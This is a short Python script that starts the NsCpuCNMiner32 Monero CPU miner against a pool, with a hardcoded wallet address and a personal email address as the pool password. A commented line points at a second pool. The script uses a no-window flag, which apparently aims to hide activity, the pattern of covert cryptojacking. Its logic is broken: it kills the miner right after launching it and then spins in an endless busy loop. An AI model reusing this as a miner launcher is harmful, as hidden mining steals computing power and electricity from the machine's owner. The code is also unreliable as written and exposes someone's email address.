#NsCpuCNMiner64 -o stratum+tcp://monerohash.com:3333 -u YOUR_WALLET_KEY_HERE -p x -t 4
import subprocess

p = subprocess.Popen(['NsCpuCNMiner32.exe', '-o', 'stratum+tcp://xmr-eu.dwarfpool.com:8050', '-u', '4685E1ye75YbkDf9HnmPee3y3oC7HD7x1QziHcsG1d9mUcEMmaUEHxvFSPJXk37DsXbcmf1Vyq4pqNogU24jWcTz5VEhAMu', '-p', 'desouzagabriel80@gmail.com', '-t', '2'], stdin=subprocess.PIPE)
CREATE_NO_WINDOW = 0x08000000
subprocess.call('taskkill /F /IM NsCpuCNMiner32.exe', creationflags=CREATE_NO_WINDOW)

p.wait()

while True:
	pass




